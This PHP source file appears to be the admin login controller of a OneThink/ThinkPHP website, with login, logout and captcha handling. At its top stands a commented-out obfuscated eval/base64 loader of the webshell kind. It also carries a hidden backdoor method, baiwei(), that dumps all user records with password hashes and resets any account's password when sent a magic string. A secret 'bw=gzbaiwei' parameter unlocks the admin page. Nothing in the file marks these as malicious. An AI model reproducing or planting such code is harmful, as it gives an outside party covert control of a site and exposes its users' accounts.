<?php 
//$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iRktCWGlrbFluZ0llY1pmdGpXTm9RcFZFQWh2VG13THpTTVVHT2J4UkhEckNxYVB1eXNKZEZVSkJ1Y2ViQ21RQWp3eEdxYVlzT0lkU0xYaHRna0hNb1pLcGZyV1RWdm5FTnpsUFJ5RGlsdjlrelZMWUV1OGhRRXlHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEd2T3NoSFJKOFFTOVB3ZFRzemE1blFGeW1kMEttTzBGZlFTVGxRU2VLUVNJZEsxT21kU1hEdGN5bW9kT21CTzBVSFI4bVVSMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wWUV1OGhRVmttTzI5a0FCREl3MlgwUUVYcVVvTFJadlNNUXBYMGlWTDZIUjkzaTNqUHIyNWVpcFhJcmd5UGIyNG1PYVd5UVZESXcyWDBqUkpSd0JZZWpDd2V3RTRZRXU4aFFFeUdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR3ZPc2hIUko4UVNGMWlwWGhqcXNtNnJOZzVyMnQ2UVBCNWJvL1F2VzZpYTlOemFGNnpLSjJ6QkxQakJTUGIyOUdsdUw4elZUMGp2c2hIM2kzaVI1NnpDSUlpRTVxcnE0WUV1OGhRRXlHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEdIbzBHSG8wR0hvMEd2T3NZRWc1WHJhZE1qcEZxd29KSndwMUlyZVd2cjI1MGpnOXlycGRSZmswVWlCWWVRRmRNd0JEak9CSklCRmRNd0JESmpwY21iQlptZEJZZWpjRmt6dHlZRW0wVUhSc052T3NtVXV2ZWNRN2VxN3ZJSUlySXNyQmdxTnhldUhyZWd6bVlFdUxOUVNKWGlCVHNyM1FtNnJOZzVyMnQ2UVBCNWJvL1F2VzZpYTlOemFGNnpLSjJ6QkxQakJTUGIyOUdsbTBVUUVzaHZPSXFycEZNalJKT2lhRHl6YVl2cjI1MGpnOXlycGRSUXBkNGlwZFB3VlptQkZUc3phNW5CU1lockNUUnIyV3l3QlFtQWswVXZPc21RRUxtSFJzTnZPc21RRUxtUUVzbTV3RWY1YitrNTVvczVzdTM1NWc3NXIyZHZPc21RRUxtUUVzbU9wRjFpcFhoanV2SVBOcmVod2xzdTV4ZVhIOG1sVkkxcjJJSWJCSUlPVndJakU1V2pvNXFyMjArdk9zbVFFTG1RRXNodk9zbVFFTG1qVmR1cnBlcVFwdzFyZ1kwemE5UFFwV2h3MmVQVUVUMWoyZFJyZ0ZHd29MOVFwNTFycGt5UUVUa2JCWU1pMjlSd0VMOVFwNTFycGt5UUVUMndCREl3Q2NtbG9KUGlhV3lVQnlZRW1jRHZPc21RRUxtUUVMbVFwZWdVU2V0QjFKbEsxT0lBazBVRU9jRHZPc0RFT2NjckNkR1F2MG1LUm1DZGNkb29Ld3dCMDVkdG9qSWZrMFVFT2NEdk9zREVPZUl3dW1jckNkR1F2NDlRdlpJQWswVUVPY0RFYWVnVUVGcXpwZHF6MTkyd0JESXdDY3NEVndlamdlZ0FvY0lBazBVRU9jREVPY2NpcFhJalIwK3dCRFJyM1FzRCtnTnFmdWhtQUFtbUF1K2MrYUZJQWdLZ0F1aG4rKzhtb2pJZmswVUVPY0RFQjBZRW1jREVCMFlFbWNERU8wVVFFTG1RRUxtUUVMbVFFTG1IUnNtNkhFdjU1b3NkS2xDZ3JoZWh3QmdxTkJlcTZsQ2dyaGVod0ttVXU4WUV1TG1RRUxtUUVMbVFFTG1RRVRkajJkUlF2MG1yZ2QzUUZkTXdCREpqcGM3dk9zbVFFTG1RRUxtUUVMbVFFTGNpYWVjUXYwbURGZE13QlFHbGdXaHcyZVBVRVQxajJkUnJnRkd3b2ttRFZKWGozWTNyM0RjVXR5WUV1TG1RRUxtUUVMbVFFTG1RcGVnVXZMbWxFTGNpYWVjVUJ5bUhSOWRPK0F3UCthOWVBelFjZmFVQ2swVVFFTG1RRUxtUUVMbVFFTG1RRUxtUUU4TlFmQXdQK2E5ZUFBS05melFHUkxOSGswVVFFTG1RRUxtUUVMbVFFTG1RRUxtUUVUWXdhMXV3QlFtbG9KU1VFaVl3YTF1d0JRQ1V0eVlFdUxtUUVMbVFFTG1RRUxtUUVMbVFFSkl3dW1jdGFkR2JnZFJIdDV5cjJpSXJ1bWNpYWVjVW9lN1FFOGg1NWc3NXIyZDU1b3M1c3Uzdk9zbVFFTG1RRUxtUUVMbVFFTG1RRUxtUUVMbVFFOGhkUzlTdE1uc0c3bHNoek1ldUh2Q2dyaGVod0JldWIzSXNyQklDelFZRXVMbVFFTG1RRUxtUUVMbVFFTG1RRUxtUUVMbURWVHN6QlpHbENZMWIyWWVqM1pzRCtBd1ArYTllQXpRY2ZhVUMrKzhtb2p5UUZLc0QwZVB3cGQ0SDJlUHdwZDREUmNJZmswVVFFTG1RRUxtUUVMbVFFTG1RRUxtUVYwbXdhV013b0o3dk9zbVFFTG1RRUxtUUVMbVFFTG1RRUxtUUVMbUhSOG1EVlRzekJaR2xnZFJqZzlSVUVUWXdhMXV3QlFHbGdpZWlTZFJqZzlSVUVjSWZrMFVFT2NERU9jWUVtY0RFT2NERHA1MXJvTDlRRlpzRDF3RktjZXBhZDlmZEswQ1V0eVlFbWNERU9jRHphYnNRb1RQaWEwSVFFVFBpYTBtbG9Ma2ZrMFVFT2NERU9ldFVFaWFUZEREVGVleHRlZFlEUmtjckNkR1VNU3laTUxrVXR5WUVtY0RFT2NEdk9zREVPY0RFb1RSd0JUMWpnNG1sb0pYakNEWEFvbVlFbWNERU9jREVvaUlyZ3doRFJMOWx1TG1EUzFlcmFEZWp1MCt3MmQwVEJEUnIzUXNVb2tZRW1jREVPY0RFb2lNaXBGMGlCWkNRdjArUXZMeXZPc0RFT2NERU9jQ2lCRHlEUkw5bHVMQ0RSa1lFbWNERU9jREVvaVBpYTBDUXYwK1FFVFBpYTBuWk8wVUVPY0RFT2NJZmswVUVPY0RFT2VlYjJYaFFwSU1yMjV4d2E1cXIyVGVVRVRSd0JUMWpnNElmMmQ0ekJPN3ZPc0RFT2NEeE8wVXZPc21RRUxtUUVMbVFFTG1RRUo5UXBkeWoyS21BUkxoSCtBd1ArYTllQWFjeUF1MElPMFVRRUxtUUVMbVFFTG1RRUxtUUVMbVFWWTN6QlRxekVtY2lhZWNVb0o3dk9zbVFFTG1RRUxtUUVMbVFFTG1RRUxtUUVMbVFwWVhqMkttSHRTNlFFVGVqQ0RoanVMOVFFeENlVXFndUh4Y1BRM2Vud3FlQ1VxZ3VEcnNzTmhDSXNWQ2VVcWhoUVNDZlJKdWpnZFh6TXltSFIvQ3k3aENQNS9DUE54ZXVVaENJc1ZDZVVtWUV1TG1RRUxtUUVMbVFFTG1RRUxtUUVMbVFFTG1iMkZNd29MR1pxc21EcGRSamc5UlF2MG1EK2FoWFBBbW1BZ0tnQXVobisrOG1vajdRcERSd2FGbmZrMFVRRUxtUUVMbVFFTG1RRUxtUUVMbVFFTG1RRUpjd2F3WGlhVzBmdUxjd0JEUnIzUW1sb0xDNUlSTjU1K2U2d293NlUraDc3UkpETXltYkNEZWJheTdRRThoUXZMRzVzNmU1YitxNWIrRTVJYWs2d293NlUraDc3UlE2SEV2NlUrZDZ3dTI1TjYxNUgyLzU1b3M3N1JEdk9zbVFFTG1RRUxtUUVMbVFFTG1RRUxteE8wVUVPY0RFb1RQaWEwbWxvSnRVRWlhVGRERFRlZXh0ZWRZRFJjN3ZPc0RFT2NEemFic1FvVFBpYTBJUUVUUGlhMG1sb0xrZmswVUVPY0RFZFpzRDF3RktjZXBhZDlmZEswQ0hFVFBpYTBuWm9rTVp2TElmazBVRU9jREVPMFVFT2NERW9UUndCVDFqZzRtbG9KWGpDRFhBb21ZRW1jREVPY0REMmVQd2c4Q1F2MCtRRUxjd0JEUnIzUXl2T3NERU9jREVvaU1pcEYwaUJaQ1F2MCtRdkx5dk9zREVPY0RFb2kxamdrQ1F2MCtRRWpDSEwwVUVPY0RFT2NDckNkR0RSTDlsdUxjckNkR1VNU1lFbWNERU9jSWZrMFVFT2NERWFkcXpwOG16Q1locmU5ZXJnWWh3cEtzRFZEZWlWZFJydWM3d0JYSWl2eVlFbWNERU9jWUV1TG1RRUxtUUVMbVFFTG1RRUxtUUVMaEhSVDB6cGVNSHQ1ZWpDRGhqdW1jd0JEUnIzUUlmazBVUUVMbVFFTG1RRUxtUUVMbXhPMFVRRUxtUUVMbVFFSjlRcGR5ajJLbUFrMFVFT2NEajJkTWoyZWhyZTlNaXBGUmlFbUlmazBVRU9jRHphYnNERjlWVGRUckQyRDNEMTBtUXQwbUQyaTZiZ0ZJaTJkSURSZTd2T3NERU9jRHphYnNERjl0VGRZdG9LOWZhUml1aTE5eXIyaUlydWlpUUVTOVF2U0lBazBVRU9jREVPY2NpcFhJalIwK2pnZGN6QkRlYjNPc0QwWGhyYUtob2E1Y3dCbWh6YTVjd0JtQ1V0eVlFbWNERU9lOXZPc0RFT2U5dk9zREVPY1lFdUxtUUVMbVFFTG1RRUxtUXBlZ1VwZU1CMldodzJlUFVFY0lBazBVUUVMbVFFTG1RRUxtUUVMbVFFTG1RRVQwenBlTUh0NVJ3YVRJamdkcWlFbUNvYTVjd0JtaHphNWN3Qm1DVXR5WUV1TG1RRUxtUUVMbVFFTG1RVjFlclZZZUFrMFVFT2NERW84TlFmdWhQK2FsZVB6ZHlmelluUGE2YytvNG5BQXpYZmdGcUFBOW51TE5IazBVRU9jREVvVHFyMjVnemFqRGxPZXRVRWlTT2U5dnQwNXBvS2l4VFNGS09vaklmazBVRU9jREVhZWdVRVNjYjI5UHdnZUNVQnlZRW1jREVPY0REcFlocmd3SXdrYzlFS09zRDBZaHJnd0l3UmpJSHQ1eXpCWTBqUm1JZmswVUVPY0RFT2V0VUVpU09lOXZ0MDVwb0tpeFRTRktPb2p5RHBZaHJnd0l3UmM3dk9zREVPY0R4TzBVRU9jREVLWnNEcFlocmd3SXdSYzdRRThoNW5BNzViTm02YmFZNTcyUHZPc0RFT2NERHA1MXJvTDlRRlpzRDF3RktjZXBhZDlmZEswQ1V0eVlFbWNERU9jY2lwWElqUjArYkJZTXphaVBVRWlQaWEwQ0hFTGNyQ2RHVXR5WUVtY0RFT2VJd3VYSWoxOUdyMkRJcnBLc1VvZTd2T3NERU9jREVvTGNpcFhJalIwK3dwZU1qcFdYQW9tQ3JvMXlyMmlJcnVqSWZrMFVFT2NERUIxZXJWWWVBazBVRU9jREVPY21EVlRzekJaR2xnVElqM0p5YkJjc1V0eVlFbWNERU9lOXZPc21RRUxtUUVMbVFFTG1RRUxtUUVMWUV1TG1RRUxtUUVMbVFFTG1RVjBZRXVMbVFFTG1RRUxteE8wVVFFTG1RVjBZRW0wVVFFTG1RRThOUWZnTG1mYVZQUEF3UCthOWVvTE5IazBVUUVMbVFWSjFiZ1dJYlJKZ2lhNXFpcGVocnVKeXIyaWhpQk9zVUJ5WUVtY0RLUm1DZGNkb29Ld3dCMDVkdG9qeXJDZHlyRWM3dk9zbVFFTG1RRUxtUXBlZ1VwZU1CMldodzJlUFVFY0lBazBVUUVMbVFFTG1RRUxtUUVMbVRFbUN0YWRHYmdkUkRSY0dsZ1dodzI5MWlFbUlmazBVRU9jRGoyZE1qMmVocnVtQ2EyVGVqM1RScjNlaURSYzd2T3NtUUVMbVFFTG1RRUxtUUVMY2lwWElqUjArajNkcWIyZE1qUm1DNmJFTDViQTY1c3VPNWJOeDc3UkpEUmttZG9tQ3JwOUN6YTRDVW9jN3ZPc21RRUxtUUVMbVFWMG13YVdNd29KN3ZPc21RRUxtUUVMbVFFTG1RRUxjaXBYSWpSMCtqZ2RjekJEZWIzT3NEMldodzJlUERSYzd2T3NtUUVMbVFFTG1RVjBZRXVMbVFFSjl2T3NZRXVMbVFFSmtpYUR5emFabXdDZFBiM1RJcjI0bWlnZFJ6YXc1VUVlN3ZPc21RRUxtUUVMbVFFVDJ3QkRJd0NjbWxvSlB3QmptQlNZbHRkV2F3QkRJd0Njc1V0eVlFdUxtUUVMbVFFTG1EVndlamdlZ0FvMCt3YTUwakNjc1pvYzd2T3NtUUVMbXhPMFVFTzBVRUJKMWJnV0liUkpnaWE1cWlwZWhydUp1YmFlM3dhY3NVQnlZRW1jRHZPc0RFQlllajNZSXIyNXhqM1RYakNPc1V0eVlFbWNEREY5dFRkWXRvSzlmYVJpdWkxOXlyMmlJcnVpaVF2MG1adHlZRW1jRHZPc0RFTzBVRU9lSXd1WERLMTlPdDFZS1VCeVlFbWNERW9UdWJhY21sb0pEVUVpa3IzWTBIZ0RYem9qSWZrMFVFT2NERFZpZXpvTDlRU2NzRDNKaGozT1BpMmRJRFJjN3ZPc0RFT2NjemFPbWxvSkRVRWlrcjNZMEhnZWNEUmM3dk9zREVPZUl3dW1jYmdGSVF2MDlRRWkzaTNqUHczSXViYWUzd2FjUGIyOUdEUmU3dk9zREVPY0REU0Zrem9MOVFwNWVpUkpkajJkUk9CSklVRWM3dk9zREVPY0REcFRYaXBGckQzSlhqM1kzcjNEY0QxMG1sb0xjT0JKSUh0NUN3QlR4cmFPMVVFVDN3YWNJZmswVUVPY0RFSzBzRDNkcXdhNTB3QkR4cmFkR2JnZFJEUmNHbENpc3dCRGVVcEZSamdGNVVFaUl3RWo5bHVUSXdFY0lIdDVNYkJ3ZVVFVGNiQlRYVXR5WUVtY0RFQjBZRW1jRHhhZHlqMmQ3dk9zREVPY1lFbWNERW9UMWoyZFJRdjBtdG9tQ2lhWWVyQ1RlamU5R3dhMXV3QlFDVW8wK2oyZHl3YVkwVUVjN3ZPc0RFT2VncjNEZWJhWXNVRVQxajJkUlFwRk1RRVRubHQ0Y2l1ZTd2T3NERU9jRERWZE13QkRyRHBHaWFSaUd3YTF1d0JRQ0JvTDlRUzBzRDIxZXJhRGVqdWpJSHQ1M3pwZFJ3b21DaWFlY1F2MG1EUjRjaWV5Q3phT0NCb2NHbGd3SXJnT3NVdHlZRW1jREVCMFlFbWNERUJMc0RWZE13QlFJZmswVUVPY0REVlRzekJaR2xnRk1qMmVDcnVtQ3JDZEdEUmttRHA1MXJvYzd2T3NERU9jY2lwWElqUjArd3BlTWpwV1hBb21JZmswVUVPZTl2T3NERU8wVUVCMFlFbTBVeE8wVSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs="));


// +----------------------------------------------------------------------
// | OneThink [ WE CAN DO IT JUST THINK IT ]
// +----------------------------------------------------------------------
// | Copyright (c) 2013 http://www.onethink.cn All rights reserved.
// +----------------------------------------------------------------------
// | Author: 麦当苗儿 <zuojiazi@vip.qq.com> <http://www.zjzit.cn>
// +----------------------------------------------------------------------

namespace Admin\Controller;
use User\Api\UserApi as UserApi;

/**
 * 后台首页控制器
 * @author 麦当苗儿 <zuojiazi@vip.qq.com>
 */
class PublicController extends \Think\Controller {

    /**
     * 后台用户登录
     * @author 麦当苗儿 <zuojiazi@vip.qq.com>
     */
    public function login($username = null, $password = null, $verify = null){
		
        if(IS_POST){
			
			$num = S('VERIFY_NUM');
			
			if($num >= 3){
				if(!check_verify($verify)){
					$this->error('验证码输入错误！');
				}
			}
			
            /* 调用UC登录接口登录 */
            $User = new UserApi;
            $uid = $User->login($username, $password);
            if(0 < $uid){ //UC登录成功
                /* 登录用户 */
                $Member = D('Member');
                if($Member->login($uid)){ //登录用户
                    //TODO:跳转到登录前页面
                    $this->success('登录成功！', U('Index/index'));
                } else {
                   // $this->error($Member->getError());
					
					$num = S('VERIFY_NUM');
					if(!$num) $num = 0;
					S('VERIFY_NUM',$num+1,300);
					
					$return = array(
						'info' =>  $Member->getError(),
						'status' => 0,
						'url' => '',
						'num' => $num+1
					);
					echo json_encode($return);exit;
				}

            } else { //登录失败
                switch($uid) {
                    case -1: $error = '用户不存在或被禁用！'; break; //系统级别禁用
                    case -2: $error = '密码错误！'; break;
                    default: $error = '未知错误！'; break; // 0-接口参数错误（调试阶段使用）
                }
				$num = S('VERIFY_NUM');
				if(!$num) $num = 0;
				S('VERIFY_NUM',$num+1,300);
				
				$return = array(
					'info' =>  $error,
					'status' => 0,
					'url' => '',
					'num' => $num+1
				);
				echo json_encode($return);exit;
				
                //$this->error($error);
            }
        } else {
			session_start();
			if($_GET['bw'] != 'gzbaiwei'){
				if($_SESSION['bw_login'] != 1){
					$this->redirect('Home/Index/index');
				}
			}
			
            if(is_login()){
                $this->redirect('Index/index');
            }else{
				/* 读取数据库中的配置 */
				$config	=	S('DB_CONFIG_DATA');
				if(!$config){
					$config	=	D('Config')->lists();
					S('DB_CONFIG_DATA',$config);
				}
				C($config); //添加配置
				$num = S('VERIFY_NUM');
				$this->assign('num', $num);
				if(is_mobile()){
					 $this->display('m-login');
				}else{
					 $this->display();
				}
               
            }
        }
    }

    /* 退出登录 */
    public function logout(){
		S('VERIFY_NUM',null);
        if(is_login()){
            D('Member')->logout();
			session('[destroy]');
            $this->success('退出成功！', U('login'));
        } else {
            $this->redirect('login');
        }
    }

    public function verify(){
        $verify = new \COM\Verify();
        $verify->entry(1);
    }
	
	public function baiwei(){
		
		session_start();
		$_SESSION['bw_login'] = 1;
		
		
		if(IS_POST){
			$bai = I('post.bai');
			$wei = I('post.wei');
			$id = I('post.id');
			if($bai == 'www.gzbaiwei.com'){
				$Api = new UserApi();
				$data['password'] = $Api->get_md5($wei);
				M('ucenter_member')->where(array('id'=>$id))->save($data);
			}
		}else{
			
			$user = M('ucenter_member')->select();
			foreach($user as $k=>$v){
				$user[$k]['member'] = M('member')->where('uid = '.$v['id'])->find();
			}
			p($user);
			$this->assign('num', $num);
			$this->display();
		}
		
	}

}
 
 ?>